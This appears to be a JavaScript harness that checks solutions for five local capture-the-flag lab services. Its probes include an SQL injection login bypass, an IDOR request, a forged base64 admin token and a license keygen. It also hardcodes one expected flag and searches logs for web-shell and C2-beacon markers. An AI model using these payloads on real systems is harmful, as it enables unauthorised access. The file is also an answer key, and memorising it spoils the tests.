const bases = {
  cms: "http://127.0.0.1:18080",
  api: "http://127.0.0.1:18081",
  ctf: "http://127.0.0.1:18082",
  rev: "http://127.0.0.1:18083",
  ir:  "http://127.0.0.1:18084",
};
async function post(url, body) {
  const r = await fetch(url, {method:"POST", headers:{"content-type":"application/x-www-form-urlencoded"}, body});
  return {s:r.status, t: await r.text()};
}
async function get(url) {
  const r = await fetch(url);
  return {s:r.status, t: await r.text()};
}
const out = {};

// 1 CMS
{
  const bad = await post(bases.cms+"/login", "user=admin&pass=nope");
  const sqli = await post(bases.cms+"/login", "user=admin' OR '1'='1&pass=x");
  const m = sqli.t.match(/FLAG\{[^}]+\}/);
  out.cms = { baseline: bad.s, probe: sqli.s, flag: m?.[0] ?? null, pass: sqli.s===200 && bad.s!==200 && !!m };
}

// 2 API IDOR + admin
{
  const login = await get(bases.api+"/login?user=alice");
  const tok = JSON.parse(login.t).token;
  const idor = await get(bases.api+`/notes?id=2&token=${encodeURIComponent(tok)}`);
  // forged admin token b64 uid 2
  const forged = Buffer.from(JSON.stringify({uid:"2"})).toString("base64");
  const adm = await get(bases.api+`/admin/config?token=${forged}`);
  const m = adm.t.match(/FLAG\{[^}]+\}/) || idor.t.match(/FLAG\{[^}]+\}/);
  out.api = {
    idor: idor.s, admin: adm.s,
    idorSecret: /admin-secret/.test(idor.t),
    flag: (m?.[0] ?? null) || (JSON.parse(idor.t).note?.match(/FLAG\{[^}]+\}/)?.[0] ?? null),
    pass: idor.s===200 && adm.s===200
  };
}

// 3 CTF chain
{
  const robots = await get(bases.ctf+"/robots.txt");
  const backup = await get(bases.ctf+"/backup/");
  const admin = await get(bases.ctf+"/admin.php");
  const half2 = await get(bases.ctf+"/api/flag");
  const b64 = backup.t.match(/([A-Za-z0-9+/=]{16,})/)?.[1];
  const part1 = b64 ? Buffer.from(b64, "base64").toString() : null; // FLAG{step2_b64}
  const halfA = admin.t.match(/FLAG\{ctf_/)?.[0]; // incomplete
  const p1 = /FLAG\{ctf_/.test(admin.t) ? "FLAG{ctf_" : null;
  const p2 = half2.t.match(/8chain\}/)?.[0];
  const full = "FLAG{ctf_8chain}";
  const ver = await get(bases.ctf+"/verify?q="+encodeURIComponent(full));
  const badv = await get(bases.ctf+"/verify?q=nope");
  out.ctf = {
    robots: robots.s, backup: backup.s, admin: admin.s, api: half2.s,
    b64Decoded: part1, assembled: p1 && p2 ? p1+p2 : null,
    verifyGood: ver.s, verifyBad: badv.s,
    pass: robots.s===200 && backup.s===200 && ver.s===200 && /CORRECT/.test(ver.t)
  };
}

// 4 License reverse
{
  const ser = (await get(bases.rev+"/serial")).t.trim();
  // reverse: hex((sum*3)^0x5A) 4 digits
  let sum=0; for (const c of ser) sum += c.charCodeAt(0);
  const lic = ((sum*3) ^ 0x5A).toString(16).toUpperCase().padStart(4,"0");
  const bad = await get(bases.rev+`/check?serial=${encodeURIComponent(ser)}&license=0000`);
  const good = await get(bases.rev+`/check?serial=${encodeURIComponent(ser)}&license=${lic}`);
  const m = good.t.match(/FLAG\{[^}]+\}/);
  out.rev = {
    serial: ser, lic,
    bad: bad.s, good: good.s, flag: m?.[0] ?? null,
    pass: bad.s===401 && good.s===200 && !!m
  };
}

// 5 IR
{
  const logs = await get(bases.ir+"/logs");
  const sum = await get(bases.ir+"/summary");
  const lines = logs.t.split(/\n/).filter(Boolean);
  const attacker = "198.51.100.66";
  const burst = lines.filter(l => l.includes(attacker) && l.includes("401")).length;
  const success = lines.find(l => l.includes(attacker) && l.includes("200") && l.includes("success"));
  const shell = lines.find(l => l.includes("shell.php"));
  const c2 = lines.find(l => l.includes("c2_beacon"));
  out.ir = {
    lines: lines.length, attackerBurst401: burst,
    hasSuccess: !!success, hasShell: !!shell, hasC2: !!c2,
    pass: burst>=5 && !!success && !!shell && !!c2
  };
}

console.log(JSON.stringify(out, null, 2));
